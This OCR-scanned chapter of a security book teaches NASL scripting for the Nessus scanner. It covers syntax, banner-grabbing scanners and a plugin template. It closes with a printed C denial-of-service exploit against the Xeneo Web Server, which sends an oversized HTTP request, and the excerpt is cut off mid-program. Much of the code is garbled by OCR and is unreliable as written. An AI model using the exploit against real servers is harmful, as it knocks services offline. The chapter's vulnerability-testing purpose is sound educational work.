if [x == 10) { 
display ["x is 10"}; 
} else if (x > 10) { 
display ("x is greater than 10*1; 
} else { 
display ("x is less than 10"); 
} 
"for" Loops 
The for loop syntax is nearly identical to the syntax used in C.This syntax is: 
for (InitializationExpression; LoopCondition; LoopExpression) { 

NASL Scripting • Chapter 2 
75 
code; 
) 
Here is an example that prints the numbers 1 through 100 (one per line): 
for (i=l; i<=100; i++) { 
displayli, 
' \ n ' ) ; 
} 
Note that after this loop is finished executing, the value of/ is 10 /.This is because 
the LoopExpression evaluates each iteration until LoopCondition becomes FALSE. In this 
case, LoopCoiiditioii (i <= WO) becomes FALSE only once i is assigned the value 101. 
"foreach " Loops 
foreach loops can be used to iterate across each element in an array. To iterate through all 
items in an array, use this syntax, which will assign each value in the array to the variable 
x: 
foreach x (array) { 
display{x, '\n'); 
} 
You can also put each array index in an array or hash using a foreach loop and the 
key* function: 
foreach k (keys(array)) { 
display ("array[", kH "] is •, arraytk] , '\n'); 
} 
"while" Loops 
while loops continue iterating as long as the conditional is true. If the conditional is false 
initially, the code block is never executed. 
i = 1; 
while (i <= 10) ( 
display (i, 
'\n')7 
i++; 
) 
"repeat-until" Loops 
repeat-tmtil loops are like while loops, but instead of evaluating the conditional before each 
iteration, it is evaluated after each iteration, thereby ensuring that the repcat-imtil loop will 
always execute at least once. Here is a simple example: 
x = 0; 
repeat ( 
display (++x, '\n r); 
) until (x >= 10); 
Break Statements 
A "break statement" can be used to stop a loop from iterating before the loop condi-
tional is FALSE.The following example shows how break can be used to count the 

Chapter 2 • NASL Scripting 
number of zeros in a string (str) before the first non-zero value. Bear in mind that if str is 
20 characters long, the last element in the array is str[19\. 
x = 0; 
len = strlen(str); 
while {x < len) ( 
if (strlx] 1= "0") { 
break; 
} 
X++; 
} 
if (x == len) { 
display ("str contains only zeros"); 
} else { 
display ("There are "H x, lr Os before the first non-zero value."); 
} 
User-Defined Functions 
In addition to the many built-in functions that make NASL programming convenient, 
you can also create your own functions. User-defined functions have the following 
syntax: 
function function_name {argumentl, argument^, ...) t 
code_block; 
) 
For example, a function that takes a string and returns an array containing the ASCII 
value of each character in the string might look like this; 
function str_to_ascii (in_string) { 
local_var result_array; 
local_var len; 
local_var i; 
len = strlen(in_striTig) ; 
for (i = 0; i < len; i++) { 
result_array[i] = ord{in_string[iJ); 
} 
return 
(result_array); 
) 
display (str_to_ascii(in_string; "FreeBSD 4.8")H 
p \ n r ) ; 
User-defined functions must be called with named arguments. For example: 
ascii_array = str_to_ascii (instring: "Hello world!"); 
Because NASL requires named function arguments, you can call functions by 
passing the arguments in any order. Also, the correct number of arguments need not be 
passed if some of the arguments are optional. 
Variables are scoped automatically, but the default scope of a variable can be over-
written using l<xal_var andglobal_wr when the variables are declared. Using these two 
commands is highly recommended to avoid accidentally writing over previously defined 
values outside of the present scope. Consider the following example: 

NASL Scripting • Chapter 2 
77 
i = 100; 
function print_garbage () { 
for (i = 0; i < 5; 1++) ( 
display {D ; 
} 
display (" 
") ; 
return TRUE; 
print_garbage{}; 
display ("The value of i is •, i); 
The output from this example is 01234— Tlie value ofi is 5.The global value of i was 
overwritten by the for loop inside the print_garbagc function because the local_v<ir statement 
was not used. 
NASL supports recursion. 
Built-in Functions 
NASL provides dozens of built-in functions to make the job of writing NASL scripts 
easier.These functions are called in exactly the same manner as user-defined functions, 
and are already in the global namespace for new NASL scripts (that is, they do not need 
to be included, imported, or defined). Functions for manipulating network connections, 
creating packets, and interacting with the Nessus knowledge base are described further 
in this chapter. 
Return 
The return command returns a value from a function. Each of the four data types (inte-
gers, strings, arrays, and NULL) can be returned. Functions in NASL can return one 
value, or no values at all (e.g., return (10, 20) is not valid). 
Writing NASL Scripts 
As mentioned earlier, NASL is designed to be simple, convenient, modular, efficient, and 
safe. This section details the NASL programming framework, and introduces some of the 
tools and techniques that are provided to help NASL meet those claims. 
The goal of this section is to familiarize the reader with the process and framework 
for programming NASL scripts. Categories of functions and examples of some specific 
functions are provided; however, a comprehensive listing and definition for every func-
tion is beyond the scope of this chapter. For a complete function reference, refer to 
"NASL2 Language Reference." 
NASL scripts can be written to fulfill one of two roles. Some scripts are written as 
tools for personal use to accomplish specific tasks that other users may not be interested 
in. Other scripts check for security vulnerabilities and misconfigurations, which can be 
shared with the Nessus user community to improve the security of networks worldwide. 

78 
Chapter 2 • NASL Scripting 
Writing Personal-Use Tools in NASL 
The most important thing to remember when programming in NASL is that the entire 
language has been designed to ease the process of writing vulnerability checks. To this 
end, there are dozens of built-in functions that make the tasks of manipulating network 
sockets, creating and modifying raw packets, and communicating with higher-level net-
work protocols (such as HTTP, FTP, and SSL) more convenient than it would be to per-
form these same operations in a more general-purpose language. 
If a script is written to fulfill a specific task, you do not have to worry about the 
requirements placed on scripts that end up being shared. Instead, you can focus on what 
must be done to accomplish your task. At this point in the process, it would behoove you 
to make heavy use of the functions provided in the NASL library whenever possible. 
Networking Functions 
NASL has dozens of built-in functions that provide quick and easy access to a remote 
host through the TCP and User Datagram Protocol (UDP) protocols. Functions in this 
library can be used to open and close sockets, send and receive strings, determine 
whether or not a host has gone down after a denial of service (DOS) test, and retrieve 
information about the target host such as the hostname, Internet Protocol (IP) address, 
and next open port. 
HTTP Functions 
The HTTP functions in the NASL library provide an application program interface 
(API) for interacting with HTTP servers. Common HTTP tasks such as retrieving the 
HTTP headers, issuing GET, POST, PUT, and DELETE requests, and retrieving 
Common Gateway Interface (CGI) path elements are implemented for you. 
Packet Manipulation Functions 
NASL provides built-in functions that can be used to forge and manipulate Internet 
Gateway Message Protocol (IGMP), Internet Control Message Protocol (ICMP), IP, 
TCP and UDP packets. Individual fields within each packet can be set and retrieved 
using various get and set functions. 
String Manipulation Functions 
Like most high-level scripting languages, NASL provides functions for splitting strings, 
searching for regular expressions, removing trailing whitespace, calculating string length, 
and converting strings to upper or lower case. NASL also has some functions that are 
useful for vulnerability analysis, most notably the trap function for testing buffer over-
flows, which returns the letter X or an arbitrary input string as many times as is neces-
sary to fill a buffer of the requested size. 

NASL Scripting • Chapter 2 
79 
Cryptographic Functions 
If Nessus is linked with OpenSSL, the NASL interpreter provides functions for returning a 
variety of cryptographic and checksum hashes, which include Message Digest 2 (MD2), 
Message Digest 4 (Ml)4), Message Digest 5 (MD5), RIPEMD160, Secure Hash Algorithm 
(SHA).and Secure Hash Algorithm version 1.0 (SHA1).There are also several functions 
that can be used to generate a Message Authentication Code from arbitrary data and a 
provided key. These functions include HMAC_DSS, HMAC_MD2, HMAC_MD4, 
HMAC_MD5, HMACJUPEMD160, HMAC_SHA, and HMAC_SHA1. 
The NASL Command Line Interpreter 
When developing NASL, use the built-in nasi command line interpreter to test your 
scripts. In Linux and FreeBSD, the NASL interpreter is installed in /usr/local/bin. At the 
time of this writing, there is no standalone NASL interpreter for Windows. 
Using the interpreter is pretty easy. The basic usage is: 
nasi -t target_ip scriptnamel .nasi scriptname2 .nasi ... 
If you want to use "safe checks" only, you can add an option -s argument. Other 
options for debugging verbose output also exist. Run man nasi for more details. 
Example 
Imagine a scenario where you want to upgrade all of your Apache Web servers from 
version 1.x series to the new 2.x series.You could write a NASL script like the one in 
the following example to scan each computer in your network, grab each banner, and 
display a notification whenever an older version of Apache is discovered. The script in 
the following example does not assume that Apache is running on the default World 
Wide Web (WWW) port (80). 
This script could easily be modified to print out each banner discovered, effectively 
creating a simple TCP port scanner. If this script were saved as apacheJind. nasi and your 
network used the IP addresses from 192.168.1.1 to 192.168.1.254, the command to run 
it using the NASL interpreter against this address range would look something like this: 
nasi -t 192.168.1.1-254 apache_find,nasl 
1 # scan all 65,535 ports looking for Apache 1.x Web Server 
2 
# set first and last to 80 if you only want to check the default port 
3 first = 1; 
4 
last = 65535; 
5 
6 
for (i = start; i < last; i++l { 
7 
# attempt to create a TCP connection to the target port 
8 
soc = open_soc_tcp(i) ; 
9 
if (soc) { 
10 
# read up to 1024 characters of the banner, or until "^n" 
11 banner = recv_line(socket: soc, length:1024); 
12 
# check to see if the banner includes the string "Apache/1*• 
13 
if (egrep(string: banner, pattern:"AServer: *Apache/1\,•)) { 
14 
display("Apache version 1 found on port ", i, "\n"); 
15 
} 

SO 
Chapter 2 • NASI Scripting 
16 
close(soc); 
17 
} 
18 
} 
Lines 3 and 4 set the variables that will be used to declare the start and end ports for 
scanning. Note that these numbers represent the entire set of ports for any given system 
(minus the zero port, which is frequently utilized for attacks or information gathering). 
Lines 8 and 9 open a socket connection and then determine if the opened socket 
connection was successful. After grabbing the banner with the inline initialization banner 
(line 11) and using the recv_Une function, a regular expression is used on line 13 to 
determine if Apache is found within the received banner. Lastly, the script indicates that 
Apache version 1.0 was found on the corresponding port that returned the banner. 
Although this example script is reasonably efficient at performing this one task, 
scripts like this would not be suitable for use with Nessus. When Nessus is run with a 
complete library of checks, each script is executed sequentially and can take advantage of 
work performed by the previous scripts. In this example, the script manually scans each 
port, grabs every banner, and checks each for "Apache." Imagine how inefficient running 
Nessus would be if every script did this much work! The next section discusses how to 
optimize NASL scripts so that they can be run from Nessus more efficiently. 
Programming in the Nessus Framework 
Once you have written a NASL script using the command line interpreter, very few 
modifications need to be made in order to run the script from the Nessus console. Once 
these changes are made, you can share the script with the Nessus community by submit-
ting it to the Nessus administrator. 
Descriptive Functions 
To share your NASL scripts with the rest of the Nessus community, they must be modi-
fied to include a header that provides a name, summary, detailed description, and other 
information to the Nessus engine. These "description functions" allow Nessus to execute 
only the scripts necessary to test the current target, and are also used to ensure that only 
scripts from the appropriate categories (information gathering, scanning, attack, DOS, 
and so on) are used. 
Knowledge Base Functions 
Shared scripts must be written in the most efficient manner possible. To this end, scripts 
should not repeat any work already performed by other scripts. Furthermore, scripts 
should create a record of any findings discovered so that subsequent scripts can avoid 
repeating the work. The central mechanism for tracking information gathered during the 
current run is called the Knowledge Base, 
There are two reasons why using the Knowledge Base is easy: 
• 
Using Knowledge Base functions is trivial and much easier than port scanning, 
manually banner grabbing, or re-implementing any Knowledge Base functionality, 

NASL Scripting • Chapter 2 
• 
Nessus automatically forks whenever a request to the Knowledge Base returns 
multiple results. 
To illustrate both of these points, consider a script that must perform analysis on 
each HTTP service found on a particular host. Without the Knowledge Base, you could 
write a script that port scans the entire host, performs a banner check, and then per-
forms whatever analysis you want once a suitable target is found. It is extremely ineffi-
cient to run Nessus composed of these types of scripts, where each is performing 
redundant work and wasting large amounts of time and bandwidth. Using the 
Knowledge Base, a script can perform the same work with a single call to the 
Knowledge Base %ct_kb_item("Services/wuw") function, which returns the port number of a 
discovered HTTP server and automatically forks the script once for each response from 
the Knowledge Base (e.g., if HTTP services were found on port 80 and 2701, the call 
would return 80, fork a second instance, and in thar instance return 2701. 
Reporting Functions 
NASL provides four built-in functions for returning information from the script back to 
the Nessus engine. The scciiiucr_stcitus function allows scripts to report how many ports 
have been scanned and how many are left to go. The other three functions (security_note, 
sccurity_u>amhig, and scairity_ho!e) are used to relate miscellaneous security information, 
non-critical security warnings, and critical security alerts back to the Nessus engine. 
These reports are then collected by Nessus and merged into the final report summary. 
Example 
Following is the same scripr seen ar the end of the previous section, re-written to con-
form to the Nessus framework.The "descriptive" functions report back to Nessus what 
the script is named, what it does, and what category it falls under. After the description 
block, the body of the check begins. Notice how Knowledge Base function 
£ct_kb_item("Scri>kes/a>mt>") is used. As mentioned previously, when this command is evalu-
ated by the NASL interpreter, a new process is forked for each value of "Services/limit'" 
in the Knowledge Base. In this way, the script will check the banner of every HTTP 
server on the target without having to perform its own redundant port scan. Finally, if a 
matching version of Apache is found, the "reporting" function sm<rity_>iote is used to 
report non-critical information back to the Nessus engine. If the script is checking for 
more severe vulnerabilities, security ^warning or securityJtoie can been used. 
1 
if (description) { 
2 
script_version("^Revisionj 
1.0 %"); 
3 
4 
name [^english41 ] = 1lFind Apache version 1.x" j 
5 
script_nante{english: name ["english" ] ) ; 
6 
7 
desc ["english*1 ] - "This script finds Apache 1-x servers. 
8 This is a helper tool for administrators wishing to upgrade 
9 
to Apache version 2.x. 
10 
11 Risk factor : Low"; 
12 

Chapter 2 * NASL Scripting 
13 
script_description(english:desc["english"]); 
14 
1 5 
summary!"english"] = "Find Apache 1+x servers.•; 
16 
script_summary(english:summary["english"]J ; 
17 
18 
seript_category(ACT_GATHER_IHFO>; 
19 
20 
script_copyright(english; "No copyright,") j 
21 
22 
family["english"] = "General"; 
23 
script_family(english:family["english"]}; 
24 
script_dependencies{ "fLnd_service.ne£", 
"no404.nasi", 
"http_version.nasi") ; 
25 
script_require_ports("Services/www"); 
26 
scE"ipt_require_keys ("www/apache") ; 
27 
exit(O); 
28 
} 
29 
30 t Check starts here 
31 
32 included"http_func.inc"); 
33 
34 port - get_kb_item( "Services/www-) ; 
35 
if ( !port) port = 80; 
36 
37 
if [get_port_state(portn { 
38 
banner = recv_line{socket: socH length:1024); 
39 
tf 
check to see if the banner includes the string "Apache/1.• 
40 
if (egrep(string: banner, pattern: """"Server: *Apache/l\ . • J ) { 
41 
display("Apache version 1 server found on port ", L, "\n"}j 
42 
j 
43 
security_note(port); 
44 } 
While every NASL script is different from the next, in general, most follow a similar 
pattern or framework that can be leveraged when creating any script. Each begins with a 
set of comments that usually include a title, a brief description of the problem or vulner-
ability, and a description of the script. It then follows with a description that is passed to 
the Nessus engine and used for reporting purposes in case this script is executed and 
finds a corresponding vulnerable system. Lastly, most scripts have a script starts here com-
ment that signifies the beginning of NASL code. 
The body of each script is different, but in most cases a script utilizes and stores 
information in the Knowledge Base, conducts some sort of analysis on a target system 
via a socket connection, and sets the state of the script to return TRUE for a vulnerable 
state if X occurs. Following is a template that can be used to create just about any NASL 
script. 
Case Study: The Canonical NASL Script 
1 i 
2 
# This is a verbose template for generic NASL scripts, 
3 # 
4 
5 # 
6 
# Script Title and Description 

NASL Scripting • Chapter 2 
83 
7 * 
8 
# Include a large comment block at the top of your script 
9 
# indicating what the script checks for, which versions 
10 # of the target software are vulnerable, your name, the 
11 # date the script was written, credit to whoever found the 
12 tt original exploit, and any other information you wish to 
13 # include. 
14 # 
15 
16 if (description) 
17 < 
18 
# All scripts should include a "description" section 
19 
# inside an "if (description) { ... )" block. The 
20 
# functions called from within this section report 
21 
# information back to Nessus, 
22 
# 
23 
# Many of the functions in this section accept named 
24 
# parameters which support multiple languages. The 
25 
# languages supported by Nessus include "english,• 
26 
# "francais, " "deutsch," and "Portuguese." If the argument 
27 
# is unnamed, the default is English. English is 
28 
# required; other languages are optional. 
29 
30 
script_version("^Revision:1.0$"); 
31 
32 
# script_name is simply the name of the script. Use a 
33 
# descriptive name for your script. For example, 
34 
# "php_4_2_x_mal£ormed_POST,nasl" is a better name than 
35 
# "php.nasl" 
36 
name ["english" ] = "Script Name in English" j 
37 
name ("francais") = "Script Name in French" ,-
38 
script_name {english: name ["english41 ] , francais:name[" f rancais" J ) ; 
39 
40 
# script_description is a detailed explanation of the vulnerablity. 
41 
desc["english"] = " 
42 This description of the script will show up in Nessus when 
43 
the script is viewed. 
It should include a discussion of 
44 what the script does, which software versions are vulnerable, 
45 
links to the original advisory, links to the CVE and BugTraq 
46 articles (if they exist), a link to the vendor web site, a 
47 
link to the patoh, and any other information which may be 
48 useful. 
49 
50 The text in this string is not indented, so that it displays 
51 correctly in the Nessus GUI,"; 
52 
script_deScription(english:deSC["english"])j 
53 
54 
# script_summary is a one line description of what the script does. 
55 
summary["english"] = "One line English description."; 
56 
summary["francais"] = "One line French description."; 
57 
script_surrjnary (english; summary [ "english" ] , francais;summary ["francais" ]) \ 
58 
59 
# script_category should be one of the following: 
60 
# ACT_INIT: Plugin sets KB items. 
61 
# ACT_SCANNER: Plugin is a port scanner or similar (like ping), 
62 
# ACT_SETTINGS: Plugin sets KB items after ACT_SCANNER. 
63 
# ACT_GATHER_INFO: Plugin identifies services( parses banners. 

Chapter 2 • NASL Scripting 
64 
# ACT_ATTACK: For non-intrusive attacks {eg directory traversal) 
65 
# ACT_MIXEE_ATTACK: Plugin launches potentially dangerous attacks. 
66 
# ACT_DESTRUCTIVE_ATTACK: Plugin attempts to destroy data. 
67 
# ACT_DENIAL: Plugin attempts to crash a service. 
68 
# ACT_KILL_HOST: Plugin attempts to crash target host. 
69 
script_category(ACT_DENIAL); 
70 
71 
# script_copyright allows the author to place a copyright 
72 
# on the plugin. Often just the name of the author, but 
73 
tf 
sometimes "GPL" or "No copyright.• 
74 
script_copyright{english:"No copyright."); 
75 
76 
# script_family classifies the behavior of the service. Valid 
77 
# entries include; 
78 
tt 
- Backdoors 
79 
# - CGI abuses 
80 
# - CISCO 
81 
tf - Denial of Service 
82 
* - Finger abuses 
83 
# - Firewalls 
84 
tf - FTP 
85 
tf - Gain a shell remotely 
86 
# - Gain root remotely 
87 
tf - General 
88 
tf - Misc. 
89 
# - Netware 
90 
# - NIS 
91 
# - Ports scanners 
92 
tf - Remote file access 
93 
ft - RPC 
94 
tf - Settings 
95 
tf - SMTP problems 
96 
# - SNMP 
97 
tf - untested 
98 
# - Useless services 
99 
tf - Windows 
100 
tt 
- Windows : User management 
101 
family [ "english" ] = "Denial of Service1*; 
102 
family["francais"] = "Deni de Service"; 
103 
script_family{english: family [ "english" ] , francais: family [ "francais"] ) ; 
104 
105 
# scriptdependencies is the same as the incorrectly-
106 
# spelled "script_dependencie" function from NASL1. 
It 
107 
tt 
indicates which other NASL scripts are required for the 
108 
tf script to function properly. 
109 
script_dependencies( "find_service.nes" I; 
110 
111 
tf 
script_require_ports takes one or more ports and/or 
112 
# Knowledge Base entries 
113 
script_require_ports(•Services/www", 80) ; 
114 
115 
tf Always e x i t from the " d e s c r i p t i o n " block 
1 1 6 
exit[0]; 
117 } 
118 
119 # 
120 tt Check begins here 

NA5L Scripting 
133 
134 
135 
136 
137 
138 
139 
140 
141 
142 
143 
144 
ft 
ft 
? 
ft 
ft 
b 
ft 
i f 
121 * 
122 
123 « 
Include cr.hor s c r i p t s and l i b r a r y functions first 
124 include("http_func,inc"); 
125 
126* Get initialization information from the KB or the target 
1 27 port = get_kb_item{"Services/www")j 
128 if ( Iport J port = 80; 
129 if ( !get_port_state(port> } exit(0); 
130 
131 if( safe_checks() ) { 
132 
Nessus users can check the "Safe Checks Only" option 
when using Nessus to test critical hosts for known 
vulnerabilities. 
Implementing this section is optional, 
but highly recommended. 
Safe checks include banner 
grabbing, reading HTTP response messages, and the like. 
grab the banner 
= get_http_banner(port: port); 
check to see if the banner matches Apache/2. 
( b =- "Server: *Apache/2\," } { 
report = " 
145 Apache web server version 2.x found - maybe it is vulnerable, but 
146 maybe it isn1t. This is just an example script after all. 
147 
148 
**Note that Nessus did not perform a real test and 
149 
"just checked the version number in the banner 
150 
151 Solution : Check www.apache.org for the latest and greatest. 
1 52 Risk factor : Low"; 
153 
1 54 
ft 
report the vulnerable service back to Nessus 
1 55 
# Reporting functions include: 
1 56 
# security„note; an informational finding 
1 57 
ft 
security_warning: a minor problem 
1 58 
ft 
security_hole: a serious problem 
159 
security_hole[port: port, data; report); 
160 
} 
161 
162 
# done with safe_checks, so exit 
163 
exit (0); 
164 
165 } else { 
166 
ft 
If safe_checks is not enabled, we can test using more intrusive 
167 
# methods such as Denial of Service or Buffer Overflow attacks. 
168 
169 
# make sure the host isnt' dead before we get started.., 
170 
if ( http_is_dead(port:port) ) exit(O) ; 
171 
172 
# open a socket to the target host on the target port 
173 
soc • h t t p _ o p e n _ s o c k e t ( p o r t ) ; 
174 
if< soc } { 
175 
# craft the custom payload, in this case, a string 
176 
payload = "some nasty string\n\n\n\n\n\n\n\n\n"; 
177 

Chapter 2 • NASL Scripting 
178 
tt 
send the payload 
179 
send(socket:soc, data:payload); 
180 
181 
# read the result. 
182 
r = http_recv(socket:soc); 
183 
184 
# Close the socket to the foreign host. 
185 
http_close_socket(soc)j 
186 
187 
tt 
If the host is unresponsive, report a serious a l e r t . 
188 
if ( http_is_dead(port:port) ) security_hole(port); 
189 
j 
190 ) 
Porting to and from NASL 
Potting code is the process of translating a program or script from one language to 
another. Porting code between two languages is conceptually very simple, but can be 
quite difficult in practice because it requires an understanding of both languages. 
Translating between two very similar languages, such as C and C++, is often made easier 
because the languages have similar syntax, functions, and so on. On the other hand, 
translating between two very different languages, such as Java and Perl, is complicated 
because the languages share very little syntax and have radically different design method-
ologies, development frameworks, and core philosophies. 
NASL has more in common with languages such as C and Perl than it does with 
highly structured languages like Java and Python. C and NASL are syntactically very 
similar, and NASL's loosely typed variables and convenient high-level string manipula-
tion functions arc reminiscent of Perl. Typical NASL scripts use global variables and a 
few functions to accomplish their tasks. For these reasons, you will probably find it easier 
to port between C or Perl and NASL than to port between Java and NASL, Fortunately, 
Java exploits are not as common as C or Perl exploits. A brief review of exploits (see 
phnthookups.com) found that approximately 90.0 percent of exploits were written in C, 
9.7 percent were written in Perl, and 0.3 percent were written in Java. 
Logic Analysis 
To simplify the process of porting code, extract the syntactic differences between the 
languages and focus on developing a high-level understanding of the program's logic. 
Start by identifying the algorithm or process the program uses to accomplish its task. 
Next, write the important steps and the details of the implementation in "pseudo code." 
Finally, translate the pseudo code to actual source code. (These steps are described in 
detail later in this chapter,) 
Identify Logic 
Inspecting the source code is the most common and direct method of studying a pro-
gram you want to re-create. In addition to the actual source code, the headers and inline 
comments may contain valuable information. For a simple exploit, examining the source 

NA5L Scripting • Chapter 2 
87 
may be all you need to do in order to understand the script. For more complex exploits, 
it might be helpful to gather information about the exploit from other sources. 
Start by looking for an advisory that corresponds to the exploit. If an advisory exists, 
it will provide information about the vulnerability and the technique used to exploit it. 
If you are lucky, it will also explain exactly what it does (buffer overflow, input validation 
attack, resource exhaustion, and so on). In addition to looking for the exploit announce-
ment itself, several online communities often contain informative discussions about cur-
rent vulnerabilities. Be aware that exploits posted to full-disclosure mailing lists, such as 
BugTraq, may be intentionally sabotaged.The authors might tweak the source code so 
that the exploit does not compile correctly, is missing key functionality, has misleading 
comments, or contains a Trojan code. Although mistakes have accidentally been pub-
lished, more often they are deliberately included to make the exploits difficult for script 
kiddies to use, while simultaneously demonstrating the feasibility of the exploit code to 
vendors, the professional security community, and to sophisticated hackers. 
It is important to determine the major logical components of the script you will be 
porting, either by examining the source code or by reading the published advisories. In 
particular, determine the number and type of network connections that were created by 
the exploit, the nature of the exploit pay load and how the pay load is created, and 
whether or not the exploit is dependent on timing attacks. 
The logical flow of one example script might look something like this: 
1. Open a socket. 
2. Connect to the remote host on the TCP port passed in as an argument. 
3. Perform a banner check to make sure the host is alive. 
4. Send an HTTP GET request with a long referrer string. 
5. Verify that the host is no longer responding (using a banner check). 
A 
NOTE 
These sites usually post exploits, advisories, or both: 
• 
http://www.securityfocus.com [advisories, exploits] 
• 
http://www.hack.co.za [exploits] 
• 
http://www.packetstormsecurity.net [exploits] 
• 
http://www.securiteam.com [advisories, exploits] 
• 
http://www.security-protocols.com [exploits] 
• 
http://www.cert.org [advisories] 
• 
http://www.sans.org [advisories] 
Pseudo Code 
Once you have achieved a high-level understanding of an exploit, write out the steps in 
detail. Writing pseudo code (a mixture of English and generic source code) might be a 
useful technique when completing this step, because if you attempt to translate state-

S8 
Chapter 2 • NASI Scripting 
ment-by-statement from a language like C, you will lose out on NASL's built-in func-
tions.Typical pseudo code might look like this: 
1 example_exploit (ip, portJ 
2 
target_ip = ip 
# display error and exit if no IP supplied 
3 
target_port = port tt default to 80 if no port was supplied 
4 
5 local_socket = get an open socket from the local system 
6 
get ip information from host at target_ip 
7 
sock • created socket data struct from gathered information 
8 
my_sock£t = connect_socket (local_socketr sock) 
9 
10 
string payload = HTTP header with very long referrer 
n 
send (my_socket, payload, length(payload) 
12 exit 
Once you have written some detailed pseudo code, translating it to real exploit code 
becomes an exercise in understanding the language's syntax, functions, and programming 
environment. If you are already an expert coder in your target language, this step will be 
easy. If you are porting to a language you do not know, you may be able to successfully 
port the exploit by copying an example, flipping back and forth between the language 
reference and a programmers guide, and so on. 
Porting to NASL 
Porting exploits to NASL has the obvious advantage that they can be used within the 
Nessus interface. If you choose to, you can share your script with other Nessus users 
worldwide. Porting to NASL is simplified by the fact that it was designed from the 
ground up to support the development of security tools and vulnerability checks. 
Convenient features such as the Knowledge Base and functions for manipulating raw 
packets, string data, and network protocols are provided. 
One approach to porting to NASL is as follows: 
1. Gather information about the exploit. 
2. 
Read the source code. 
3. 
Write an outline, or develop a high-level understanding of the scripts logic. 
4. Write detailed pseudo code. 
5. Translate pseudo code to NASL. 
6. Test the new NASL script with the NASL interpreter. 
7. Add script header, description, and reporting functions. 
8. Test the completed NASL script with Nessus. 
9. 
Optionally, submit the script to the Nessus maintained 
As you can see, the general process for porting to NASL begins by following the 
same general steps taken in porting any language; understand the script, write pseudo 
code, and translate to actual source code. 
Once the script is working in the NASL interpreter, add the required script header, 
reporting functions, and description functions. Once these headers are added, you can 

NA5L Scripting • Chapter 2 
test your script from the Nessus client and submit your script to the Nessus adminis-
trator to be included in the archive. 
T h e following sections provide detailed examples of this process in action, 
Porting to NASL from C/C++ 
T h e following is a remote buffer overflow exploit for the Xeneo Web server, that will 
effectively D O S the Web server. 
1 
/* Xeneo Wsb Server 2.2,2.10.0 DOS 
2 
* 
3 
* Foster and Tommy 
4 
v 
5 
6 
#include <winsock2Th> 
7 
#include <stdioTh> 
s 
9 ttpragma comment[lib, "ws2_32.lib*} 
10 
11 
char exploit[J = 
12 
1 3 "GET /index, html ?te5tvariable=!inexttestvariable=gif HTTP/1 . l\r\n" 
14 
"Referer: 
http://localhost/%%%%%%%%%%%%%%%%%%%4*%%%%%%%%%%%*%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%% 
%%*%%*%%%%%%%*%%%%%%%%*%*%%%%%*%%%%%%%%%%%*%**%%%%%%%%%%*%%*%%%%%%%*%%*%%*%%*%%*%**%*%%%%%*% 
*%*%%*%*%%*%%*%%%%%*%%%%%%%%*%%%%%*%%%%*%%%%%%%%%%%%%*%%*%%*%%%%%*%**\r\n' 
15 
"Content-Type; application/x-www-form-urlencoded\r\n" 
16 
"Connection: Keep-Alive\r\n" 
17 
"Cookie: VARIABLE=SPLABS; path=/\r\n" 
18 
"User-Agent: Mozilla/4.76 [en] 
(Xll; U; Linux 2.4.2-2 iS86)\r\n" 
19 
"Variable: r e s u l t \ r \ n " 
20 
"Host: 
localhost\r\n" 
21 
"Content-length: 
513\r\n" 
22 
"Accept: image/gifH 
image/x-xbitmap, 
image/jpeg, image/pjpeg, 
image/png\r\np 
23 
hAccept-Encoding: gzip\r\nM 
24 
"Accept-Language: en\r\n* 
25 
"Accept-Charset: 
iso-8859-1,*,utf-8\r\n\r\n\r\n" 
26 
• wha ty ou type a=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA^ 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAJUWiAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\n" ; 
27 
28 
int maiii{int argc, char *argv[ ] ) 
29 
[ 
30 
WSADATA wsaData; 
31 
WORD wVersionRequested; 
32 
struct hostent 
*pTarget; 
33 
struct sockaddr_in 
sock; 
34 
char "target, buffer[30000] ; 
35 
int port.bufsiee; 
36 
SOCKET mysocket; 
37 
38 
if (argc < 2) 

Chapter 2 • NASL Scripting 
39 
t 
40 
printf {"Xeneo Web Server 2.2.10.0 DoS\r\n <badpack3t@security-protocols.com>\r\n\r\n" 
argv[0]); 
printf("Tool Usage:\r\n %s <targetip> [targetportl 
{default is 80)\r\n\r\n", 
argv[0]); 
42 
printf("www.security-protocols.com\r\n\r\n" H 
argv[0]); 
43 
exit(l); 
44 
} 
45 
46 
wVersionRequested = MAKEWORDtl. 1); 
47 
if (wSAStartuptwVersionRequesteo', Swsaoatal < 01 return -1; 
48 
49 
target = argv[l]; 
50 
51 
//for default web attacks 
52 
port = 80; 
53 
54 
if large >= 3) port = atoi(argv[2]); 
55 
bufsize = 512; 
56 
if (argc >= 4) bufsize = atoi(argv[3]); 
57 
58 
mysocket = socket(AF_INET, SOCK_STREAM, 0); 
59 
if (mysocket==INVALID_SOCKET) 
60 
{ 
61 
printf("Socket error!\r\n"J; 
62 
exit(1); 
63 
} 
64 
65 
printf("Resolving Hostnames.T.\n")j 
66 
if ((pTarget • gethostbyname(target)) == NULL) 
67 
t 
68 
printf("Resolve of %s failed\n", argv[l]); 
69 
exit(l); 
70 
} 
71 
72 
memepy(isock,sin_addr.s_addrH 
pTarget->h_addr, 
pTarget->h_length); 
73 
sock.sin_family • AF_INET; 
74 
sock,sin_port = htons((USHORT)port); 
75 
76 
printf("Connecting...\n"); 
77 
if ( (connect(mysocket, (struct sockaddr M&sock, sizeof (sock) ))) 
78 
{ 
79 
printf ("Couldn" t connect to host. \n") ; 
80 
exit(l)r 
81 
} 
82 
83 
printf("Connected!..T\n"); 
84 
printf("Sending Payload...\n"); 
85 
if (send(mysocket, exploit, sizeof(exploit)-lr 0) == -1) 
86 
{ 
87 
printf("Error Sending the Exploit Payload\r\n"); 
88 
closesocket(mysocket); 
89 
exit ID ; 
90 
} 
91 
92 
printf("Remote Webserver has been DoS'ed \r\n")? 
93 
